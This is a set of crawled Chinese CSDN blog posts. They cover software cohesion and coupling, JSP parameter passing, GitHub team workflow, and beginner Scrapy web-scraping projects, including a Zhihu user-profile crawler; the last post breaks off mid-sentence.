{"timestamp": "2018_08_14_11_12_28", "desc": "软件工程都在追求“高内聚低耦合”，到底什么是内聚，什么是耦合呢？ \n1.首先，我们来明确什么是模块 \n模块是一系列语句组成的，由标识符组成的边界元素来界定的。比如面向对象语言中的一个类、一个方法；也如面向过程中的函数。\n\n2.内聚 \n所谓的内聚是指模块内的交互程度，内聚又分为一下几种\n\n\n偶然性内聚：组件的部件是不相关的，只是简单地绑定成单个组件。 \n不足：程序的可读性和复用性差\n逻辑性内聚：把相似的功能（类如输入，错误处理）放在一块，通过传递一个参数来决定是哪一个功能来执行。 \n不足：接口可读性差，代码复用性低\n时间性内聚：所有的语句在同一时刻被激活，就像电脑关机的时候，其他所有的程序都要被关闭。 \n不足：模块内的关联不高，而与模块外的关联却很高，所以在维护的时候工作量会 比较大。\n过程性内聚：简单地把一系列过程关联在一起 \n不足：代码的复用性比较差\n通信性内聚：操作相同的输入数据或者输出相同的输出数据，可能产生多种功能。 \n不足：代码的复用性不高\n顺序内聚：从一个部分的输出作为另一部分的输入。可能包含几个功能或部分不同的功能。 \n不足：代码的复用性不高\n信息聚合：执行多个功能，每个函数都有自己的入口点，每个函数都有独立的代码，所有的功能都在相同的数据结构上执行。不同于逻辑衔接，因为功能没有交织在一起。\n功能内聚：每一部分都需要执行一个单一的功能。例如，计算平方根或排序数组。通常在其他情况下可重复使用。维修容易。 \n以上几种内聚程度由低到高\n\n3.耦合 \n耦合是指模块之间的交互程度\n内容耦合 \n如果一个模块直接操作操作另外一个模块中的内容，比如下面的代码：\n\n\n\n\npublic class Product {     \npublic float unitPrice;    \n…… } \npublic class Order { \n    private Product myProduct=new Product(); \n            myProduct.unitPrice = -100; \n                } \n         }\n\n\n\n公共耦合 \n就像一个类中的全局变量类中的模块都直接操作这个全局变量\n控制耦合：通过控制标志（作为参数或变量），一个模块控制另一个模块的处理步骤的顺序。\n印记耦合：如果一组模块通过参数表传递记录信息，就是印记耦合。事实上，这组模块共享了这个记录，它是某一数据结构的子结构，而不是简单变量。这要求这些模块都必须清楚该记录的结构，并按结构要求对此记录进行操作。在设计中应尽量避免这种耦合，它使在数据结构上的操作复杂化了\n\n-数据耦合 \n如果一个模块访问另一个模块时，彼此之间是通过数据参数(不是控制参数、公共数据结构或外部变量)来交换输入、输出信息的，则称这种耦合为数据耦合。由于限制了只通过参数表传递数据，按数据耦合开发的程序界面简单、安全可靠。因此，数据耦合是松散的耦合，模块之间的独立性比较强。在软件程序结构中至少必须有这类耦合。\n\n\n以上所有的耦合度有高到低，越低的耦合越好", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/gpwner/article/details/53455217", "title": "模块的内聚和耦合"}
{"timestamp": "2018_08_14_11_12_28", "desc": "想想学javaweb已经有了一些时日了，现在总结一下JSP页面之间的传参方法\n\n\n\n1.利用javabean\n\nJavabean类：\n\n\n\npackage entity;\n\npublic class User {\n    private String username=\"\";\n    private String gender=\"\";\n    public String getUsername() {\n        return username;\n    }\n    public void setUsername(String username) {\n        this.username = username;\n    }\n    public String getGender() {\n        return gender;\n    }\n    public void setGender(String gender) {\n        this.gender = gender;\n    }\n    public User() {\n    }\n}\n\n\n传参数的页面\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <jsp:useBean id=\"user\" class=\"entity.User\" scope=\"session\" />\n    <center>\n        <h1>传参页面</h1>\n    </center>\n    <hr>\n    <%\n        user.setUsername(\"绅士\");\n        user.setGender(\"男\");\n    %>\n    <center>\n点击我，<a href=\"receive.jsp\">跳转</a>\n    </center>\n\n</body>\n</html>\n\n接收参数的页面\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n        <hr>\n        <jsp:useBean id=\"user\" class=\"entity.User\" scope=\"session\"></jsp:useBean>\n        <p>使用JSP动作接收传参</p>\n        <h4>\n            性别：<jsp:getProperty name=\"user\" property=\"username\" /><br> 密码：<jsp:getProperty\n                name=\"user\" property=\"gender\" /><br>\n        </h4>\n        <hr>\n        <p>使用JSP普通方式接收参数</p>\n        <h4>\n            性别：<%=user.getUsername()%><br> 密码：<%=user.getGender()%><br>\n        </h4>\n    </center>\n</body>\n</html>\n\n测试结果：\n\n传参页面： \n \n接收参数页面： \n\n\n\n\n2.绑定到session对象\n\n传参页面：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n    </center>\n    <hr>\n    <%\n    session.setAttribute(\"username\", \"绅士\");\n    session.setAttribute(\"gender\", \"男\");\n\n    %>\n    <center>\n         <a href=\"receive.jsp\">传递参数</a>  \n    </center>\n</body>\n</html>\n\n接收参数页面：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>接收参数页面</h1>\n        <hr>\n        <%  \n\n            out.print(\"姓名:\"+session.getAttribute(\"username\"));  \n        %>  \n        <br/>  \n        <%  \n            out.print(\"性别:\"+session.getAttribute(\"gender\"));  \n        %>  \n    </center>\n</body>\n</html>\n\n由于测试结果都成功了，博主就不上图了\n\n\n\n3.绑定到application\n\n传参页面：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n    </center>\n    <hr>\n    <%\n    application.setAttribute(\"username\", \"绅士\");\n    application.setAttribute(\"gender\", \"男\");\n\n    %>\n    <center>\n         <a href=\"receive.jsp\">传递参数</a>  \n    </center>\n</body>\n</html>\n\n接收参数页面：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>接收参数页面</h1>\n        <hr>\n        <%  \n\n            out.print(\"姓名:\"+application.getAttribute(\"username\"));  \n        %>  \n        <br/>  \n        <%  \n            out.print(\"性别:\"+application.getAttribute(\"gender\"));  \n        %>  \n    </center>\n</body>\n</html>\n\n\n\n4.绑定到request对象\n\n这里用采用的是请求转发的方式 \n传参页面：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n    </center>\n    <hr>\n\n        <%  \n            request.setAttribute(\"name\",\"绅士\");  \n        %>  \n        <jsp:forward page=\"receive.jsp\"/>  \n\n</body>\n</html>\n\n接收参数页面\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>接收参数页面</h1>\n        <hr>\n        <%  \n            out.println(\"传递过来的参数是：\"+request.getAttribute(\"name\"));  \n        %>  \n    </center>\n</body>\n</html>\n\n测试结果： \n因为是请求转发所以页面很快的速度跳转到了接收参数的页面，所以运行结果没有显示传递参数的内容，但是浏览器的地址是传递页面的地址\n\n\n\n\n\n表明参数已经成功传过去了\n\n\n\n5.使用JSP动作指令传参\n\n传参页面\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n    </center>\n    <%\n    String username=\"绅士\";\n    String gender=\"男\";\n    %>\n    <hr>\n    <jsp:forward page=\"receive.jsp\">\n        <jsp:param name=\"name\" value=\"Jakc\"  />\n        <jsp:param name=\"gender\" value=\"man\" />\n    </jsp:forward>\n</body>\n</html>\n\n接收参数页面：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>接收参数页面</h1>\n        <hr>\n        <%\n        request.setCharacterEncoding(\"utf-8\");\n            String name = request.getParameter(\"name\");\n            out.print(\"姓名:\" + name);\n        %>\n        <br />\n        <%\n            out.print(\"性别:\" + request.getParameter(\"gender\"));\n        %>\n    </center>\n</body>\n</html>\n\n这里采用的也是请求转发的方式\n\n\n\n6. 表单传参\n\n传参页面\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n    </center>\n    <form action=\"receive.jsp\" method=\"get\" align=\"center\">\n        姓名：<input type=\"text\" name=\"name\" size=\"20\" value=\"\" maxlength=\"20\"><br />\n\n        密码：<input type=\"password\" name=\"password\" size=\"20\" value=\"\"\n            maxlength=\"20\"><br /> <br /> <input type=\"submit\"\n            name=\"submit\" value=\"登录\"> <input type=\"reset\" name=\"reset\"\n            value=\"重置\"><br />\n    </form>\n</body>\n</html>\n\n接收参数页面\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>接收参数页面</h1>\n        <hr>\n        <%\n            request.setCharacterEncoding(\"utf-8\");\n            String name = request.getParameter(\"name\");\n            out.print(\"姓名:\" + name);\n        %>\n        <br />\n        <%\n            out.print(\"性别:\" + request.getParameter(\"password\"));\n        %>\n    </center>\n</body>\n</html>\n\n\n\n7.URL传参\n\n传参页面：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n    </center>\n    <hr>\n    <%!\n\n    String username=\"绅士\";\n    String gender=\"男\";\n\n    %>\n    <center>\n         <a href=\"receive.jsp?username=<%=username %>&gender=<%=gender%>\">传递参数</a>  \n    </center>\n</body>\n</html>\n\n接收参数页面：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>接收参数页面</h1>\n        <hr>\n        <%  \n            String name=request.getParameter(\"username\");  \n\n            out.print(\"姓名:\"+name);  \n        %>  \n        <br/>  \n        <%  \n            out.print(\"性别:\"+request.getParameter(\"gender\"));  \n        %>  \n    </center>\n</body>\n</html>\n\n结果：\n\n传参页面： \n \n接收参数页面： \n\n\nURL传参的时候还有一个特别的用处，是当你在JSP页面中使用for循环输出某些信息的时候，URL传参的独特之处就体现出来了 \n假设我使用for循环5次，每次浏览器输出点击我跳转，并同时向session绑定参数（方便起见就用循环变量吧）\n\n像这样：\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n    <%\n        for (int i = 0; i < 5; i++) {\n            session.setAttribute(\"index\", i);\n    %>\n    <a href=\"receive.jsp\">点击我跳转 </a><hr>\n\n\n    <%\n        }\n    %>\n    </center>\n</body>\n</html>\n\n接收页面\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>接收参数页面</h1>\n        <hr>\n\n        接收到的顺序：<%=session.getAttribute(\"index\") %>\n\n    </center>\n</body>\n</html>\n\n没测试之前误以为点击不同的连接会传递不同的参数，但是事实上却是每一次穿过来的参数都是4，这就很奇怪!\n\n\n\n为什么是这样呢？ \n这里博主做出解释：因为session要等到输出所有的内容，也就是说等到递增到4之后，才将最后一个i的值传给下一个页面（也就是说，i=0,时候，session绑定的对象的值是0,i=1的时候，绑定的对象的值是1,…….） \n但是呢要等到i递增到4之后整个JSP页面输出完毕之后才传到下一个JSP页面，所以每一次传到去的参数就是4，接收到的参数自然每一次都是4了！\n\n那我们要怎么做才能做到当我点击不同的连接的时候传递参数是其对应的参数呢？？（比如说我们点击第一个链接的时候，传递过去的参数是0；第二个参数的时候，参数是1….）\n\n这个时候使用URL传参就很好用了\n\n\n\n<%@page import=\"java.util.ArrayList\"%>\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>参数传递页</title>\n</head>\n<body>\n    <center>\n        <h1>传参页面</h1>\n    <%\n        for (int i = 0; i < 5; i++) {\n    %>\n    <a href=\"receive.jsp?index=<%= i %>\">点击我跳转 </a><hr>\n\n\n    <%\n        }\n    %>\n    </center>\n</body>\n</html>\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>接收参数页</title>\n</head>\n<body>\n    <center>\n        <h1>接收参数页面</h1>\n        <hr>\n        <%--接收参数的时候必须使用这个方法否则会找不到传递过来的参数 --%>\n        使用request.getParameter接收到的参数 接收到的顺序：<%=request.getParameter(\"index\")%>\n        <hr>\n        使用request.getAttribute接收到的参数\n        <%=request.getAttribute(\"index\")%>\n    </center>\n</body>\n</html>\n\n这里请注意了，一定要使用request.getParameter(string name)这个方法才能得到参数，否则是不能得到参数的！\n\n这里给出使用不同方法获取传递过来的参数的结果，\n\n\n\n\n\n这种细节性的东西一定要注意了哦！！ \n至此JSP页面之间的七大传参方式，博主已经介绍完毕了，希望对你有帮助！", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/gpwner/article/details/51586760", "title": "Javaweb开发中不同JSP页面之间的七大传参方式"}
{"timestamp": "2018_08_14_11_12_28", "desc": "前面我记录了如何上传自己的项目到个人github账户上，当团队协作的时候，该如何运用git来进行版本控制呢？\n\n1.  在项目的发起者或者Leader上传自己的代码到github上 \n（[不清楚怎么上传自己的代码到github上的请点击这个链接]http://blog.csdn.net/gpwner/article/details/52829187）\n\n这次我以Gpwner上的recyclerview这个项目来举例 \n \n2.点击项目的setting->Collaborators,输入团队成员的Github账户 \n \n然后就是坐等团队成员同意，这里假设Gpwner是项目的Leader，DiKeYuTa是成员。 \n3.在团队成员的PC上登录其账户，在这里是登录DiKeYuTa绑定的邮箱 \n \n可以看到DiKeYuTa绑定的邮箱已经收到了来自Gpwner的邀请了，点击 \nView invitation，然后会跳转到以下界面 \n \n点击accept  invitation就可以了 \n4.现在Leader登录自己的账号就可以看到，团队成员已经成功添加到该项目的协作人员了 \n \n5.DiKeYuTa在自己的PC上clone下来该项目 \n我使用的是Git（[Git安装教程，点击进入]http://blog.csdn.net/gpwner/article/details/52829187）\n\n************************************************************************\n\n如果没有配置好SSH key的，先配置以下，步骤如下：\n\n\n在PC任意地方右键，选择\n\n\n\n\ngit bash here \n\n然后输入：\n\n\n\nssh-keygen -t rsa -C \"youremail@example.com\"\n//youremail@example.com是你的在github注册时候使用的时候的邮箱\n\n然后一路回车，知道看到提示所创建的SSHkey路径，就说明你的SSH已经创建成功了  \n\n\n我SSHkey是在：C:\\Users\\Gpwner.ssh  \n进入该目录打开id_rsa.pub,打不开的选择打开方式为记事本 复制好里面的内容\n\n \n\n\n然后在https://github.com登录DiKeYuTa账号,进入个人账号下的setting->SSH and GPG KEY->New SSH KEY,输入标题和刚才复制好的ssh key，最好点击add SSH key \n\n\n回到git bash  \n输入以下指令验证是否配置成功：\n\n\n\nssh -T git@github.com\n\n\n如下图说明你的ssh已经配置成功了 \n\n\n\n\n************************************************************************\n\n进入Leader的项目下复制好git远程地址。\n\n在PC 的任意位置鼠标右键，选择git bash here \n\n\n然后输入git clone git@github.com:Gpwner/Recyclerview.git,静等clone完毕就好了 \n \n6.经过以上步骤，所有的准备工作已经完成了接下来就是更新你的代码到github上的远程仓库了，这里以我在clone下来的项目里面新添加了一个txt文件举例， \n \n我在clone下项目的目录下，新建了一个2016年11月12日130728.txt文件 ，然后回到git bash 中 \n每次提交新的代码，都要先同步远程仓库，看看有没有其他人有更新，否则自己的代码将无法提交上去 \n输入：\n\n\n\ngit pull\ngit add .\ngit commit -m \"bbb\"\ngit push\n\n如果你不同步直接提交话有可能会报以下错误：\n\n\n\n ! [rejected]        master -> master (fetch first)\nerror: failed to push some refs to 'git@github.com:Gpwner/Recyclerview.git'\nhint: Updates were rejected because the remote contains work that you do\nhint: not have locally. This is usually caused by another repository pushing\nhint: to the same ref. You may want to first integrate the remote changes\nhint: (e.g., 'git pull ...') before pushing again.\nhint: See the 'Note about fast-forwards' in 'git push --help' for details.\n\n回到Leader的账号，可以看到DiKeYuTa刚才提交的东西已经同步到了该远程仓库", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/gpwner/article/details/53140016", "title": "Git教程之一个团队如何在github上协作开发"}
{"timestamp": "2018_08_14_11_12_28", "desc": "本项目实现了对知乎用户信息的爬取，并没有用数据库等，只是简单地用一些提取了一些字段然后存储在了一个csv文件中，但是同样可以实现无线爬取，理论上可以实现万级数据的爬取（当然取决于网速了）\n\n其实想爬取知乎网站是不需要进行登录的，通过一个个人账号就可以直接进行爬取了。\n\n事先准备：要求不多，其实掌握了基本的scrapy爬虫编写的方式就可以了，当然对python的基本语法要有了解，还有就是一定的逻辑处理能力。\n\n好了，我们来开始进行项目的解析： \n我们首先从一个 个人账户的首页进行解析数据，比如我们最爱的——轮子哥 \n \n两个箭头的位置使我们接下来要重点分析的地方，我们要爬取的就是轮子哥的详细信息，我们打开开发者工具，找到页面的源码，找出轮子哥的详细信息在源码中的位置 \n \n我用的fiddler找到请求，在响应中，我发现轮子哥的详细信息都在一个data-state的变量中，而且变量明显是一个json类型的数据（\"是双引号），那我们接下来就是提取这个json数据中我们需要的数据 \n第一步：把json数据提取出来，用正则表达式re提取json数据\n\n\n\n x = response.body.decode('utf-8')\n # 用utf8解码响应的数据流\n y = re.search('data-state=\"({.*?})\"', x).group(1).replace('&quot;', '\"')\n # 用re提取json数据，并用双引号\"替换&quot;字符\n\n经过上面一步就是y就是一个标准的json数据了，那接下来在这个数据中找信息，这么乱怎么找? \n我们可以用一个json在线解析，将json数据进行格式化，如图： \n \n这里只用把json数据放进去就可以自动化在右边输出一个json格式的数据。接下来我们就只剩下解析json数据了。这个应该不难吧！ \n其实代码的大部分就是一个解析json’数据的过程，用json.loads方法将json数据转化为python字典的形式，然后用字典的方法提取我们想要的信息，明显几乎所有的信息都在users这个键里面。\n\n好了，提取完了轮子哥的基本信息，这是一个魔伴，我们是要提取所有人的信息，所以要实现一个循环，让虫子爬，顺着轮子哥的关注的人爬，然后再爬，一直爬！！！ \n这就是一个逻辑的问题。\n\n我们再来分析一下我们的start_urls，https://www.zhihu.com/people/excited-vczh/activities  这个链接我们改变的只有一个exci-vczh,也就是说每个人的主页都是这样组成的，那么我们怎么拿到这个东西呢？\n\n好，我们再分析一下那个json数据 \n \n可以看到那个urlToken关键字所对应的值刚好使我们需要的字段，那么没话说，我们需要去找到其他人的这个urlToken。找谁的呢，我们来找轮子哥关注的人的\n\n \n我们点击轮子哥关注的人,然后跳转页面，然后检查页面！ \n和前面一步一样，我们在这个页面的响应内容里面仍能找到一个data-state变量，也是存储了一个json的数据，我们提取这个数据，然后再json解析器中解析就能找到他关注的人的urlToken，好了，我们接下来只要用URLToken进行替换就可以了！ \n逻辑代码贴出来：\n\n\n\n    def parse_fellow(self,response):\n        x = response.body.decode('utf-8')\n        y = re.search('data-state=\"({.*?})\"', x).group(1).replace('&quot;', '\"')\n        dict_y = json.loads(y)\n        users = dict_y.get('entities').get('users')\n        for user in users.keys():\n            urlToken = users.get(user).get('urlToken')\n            url = 'https://www.zhihu.com/people/{}/activities'.format(urlToken)\n            yield scrapy.Request(url=url,callback=lambda response,name=urlToken: self.parse_urlToken(response,name))\n# 当解析函数有多个参数时，我们就可以用这种方式专递多个参数了！\n\n这样我们基本上完成了知乎的递归爬取信息，似乎是一个广度优先的爬取方式 \n由于我们这次只是简单的爬取，就不用数据库了，直接存进一个csv文件中\n\n\n\nscrapy crawl zhuhuspider -o zhuhu_massage.csv\n\n这样运行起来，我们就可以在文件中找到爬取的数据了！，贴图！！！！ \n我怕去的字段有： \n    school_and_major = Field()  # 学校和专业 \n    id = Field() # id \n    favoriteCount = Field() \n    voteupCount = Field() \n    headline = Field() \n    urlToken = Field() \n    employments = Field() \n    job_and_company = Field() # 公司和职位\n\n\n\n这就是今天的知乎爬虫项目，可以无限爬取，不过图书馆网速比较慢，所以一个小时只爬取了1500条数据，然后就强行终止程序了！\n\n源码就不给了，因为复制了就可以直接运行，可能会给网站造成一定的压力！ \n对了，强行加一张图！！！", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/killeri/article/details/80349050", "title": "scrapy实战项目（简单的爬取知乎项目）"}
{"timestamp": "2018_08_14_11_12_28", "desc": "几个非常适合新手练习python爬虫的网页，总有一款能搞定！ \n话不多说，直接干货了！\n\n头条图集:抓包获取json数据 \n打开今日头条主页，搜索小姐姐，或者其他你感兴趣的内容，然后点击图集\n\n\n\n动态加载的json数据就出来了，没有反爬，注意的是，如果不想去内容里面抓图片的话，可以只抓缩略图，就是这个页面显示的图片，它在json数据中的image_list中，注意，将url中的list换成origin，就是大图哦！代码如下\n\n \n所有的图片地址都出来了！\n\n全书网：直接源码匹配重点内容相关内容 \n直接搜索全书网，打开主页，随便找一篇小说，比如《盗墓笔记》，点击后跳转到网页，在点击开始阅读，出现了所有章节，在进入章节就出现了小说内容，网页内容和代码如下：\n\n\n\n\n\n80电子书：匹配到地址直接下载压缩文件 \n80电子书网和上面的全书网比较类似，但是它本身提供有下载功能，可以直接用小说Id和名字直接构建下载文件，页面截图和代码：\n\n\n\n \npython学习交流群542110741 \n \n其他类似网站\n\n类似的网站还有：妹子图网、美桌网、笔趣阁、久久等等甚至百度图片也可以用抓包获取数据的！\n\n以上代码都是随手写的，没有排版，大家有兴趣可以自己排下版，或者比如小说网站，可以先抓取大类别，然后在每一个类别中获取所有小说，最后在把所有小说的内容抓出来，这样就是全站爬虫了！！！\n\n\n\n如果大家还有什么适合的网站，希望能在评论区里共享下哦！大家一起交流下！", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/programmer_yf/article/details/80596041", "title": "几个非常适合新手练习python爬虫的网页，总有一款能搞定！"}
{"timestamp": "2018_08_14_11_12_29", "desc": "推荐我的个人博客 http://blog.wuzhenyu.com.cn\n\n\nscrapy 是一个用 python 语言编写的，为了爬取网站数据，提取结构性数据而编写的应用框架。\n\n环境\n\n本文使用的环境：\npython 3.5.2 \npip 9.0.1 \n操作系统： Ubuntu 16.04\n\n\n\npythton 环境搭建\n\n在官网下载 Ubuntu 环境下的python3.5的安装包，安装，安装完成后，检查一下 python 的安装情况，一般pyhton安装的时候，pip 也是一起安装好的，如果没有安装完全，再将 pip 也一起安装好。\n\n\n\n虚拟环境搭建\n\n现在Ubuntu默认是安装 python2.7 的，避免两个环境之间切换的麻烦，我们安装 python 虚拟环境来解决这个问题。\n\npip install virtualenv\npip install virtualwrapper\npip list # 查看已安装\n\n\nvirtualenv 能够通过根据不同的 python 版本创建对应不同版本的虚拟环境，virtualwrapper 能够方便的在不同的虚拟环境之间进行切换。安装完成之后，下面我们创建一个 python3.5.2 版本的虚拟环境\n\nsource /usr/local/bin/virtualwrapper.sh #这个与 windows 不一样，需要先执行一下脚本才能生效，大家可以打开这个文件看一下\n# 创建一个名为 py3Scrapy 的虚拟环境\nmkvirtualenv py3Scrapy -p /usr/bin/python3.5\n# workon 查看创建好的虚拟环境，虚拟环境的保存路径可以通过 `VIRTUALENV_PYTHON` 来配置\nworkon\nworkon py3Scrapy # 进入选择的虚拟环境\n\n\n如下图所示： \n\n\npython的版本也能查看得到，进入虚拟环境之后，在shell前面会出现虚拟环境的名称，退出虚拟环境\n\ndeactivate\n\n\n好了，创建好环境之后，现在来开始我们的 scrapy 之旅吧。\n\n\n\nscrapy 环境搭建\n\nscrapy 是基于 twisted 框架的，大家会发现，安装 scrapy 的时候，会需要安装很多包。\n\npip install scrapy\n\n\n使用 pip 进行安装，方便，但是这种默认的安装方式，实在官网下载安装包来进行安装的，比较慢，大家可以使用豆瓣源来进行安装\n\npip install scrapy -i https://pypi.douban.com/simple\n\n\n这种方式，下载会非常的快，安装其他的包都可以使用这种方法，但是，如果使用豆瓣源安装的时候，提示找不到符合版本的安装包，那就使用第一种办法进行下载安装，因为豆瓣源可能没有官网那么及早更新。\n\n因为每个人的环境都可能存在差异，安装过程中会出现一些问题。当如果报错，twisted 安装失败的时候，建议从官网下载 twisted 安装包，自行进行安装，安装完成之后，再接着继续上面 scrapy 的安装，安装完成之后，检查一些安装结果\n\nscrapy -h\n\n\n\n\n使用 scrapy 获取某一个文章的信息\n\n好了，环境准备好之后，接下来我们来分析一下伯乐在线的文章网页结构\n\n\n\n分析伯乐在线某一篇文章的网页结构和url\n\n伯乐在线网站不需要我们先登录，然后才能访问其中的内容，所以不需要先模拟登录，直接就能访问网页。伯乐在线地址为 https://www.jobbole.com，这上面的文章质量还是不错的，大家有时间可以看看。\n\n我们随便找一篇文章试图来分析一下，比如 